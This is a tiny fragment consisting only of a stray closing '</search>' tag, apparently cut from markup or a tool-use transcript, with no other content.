 </search>
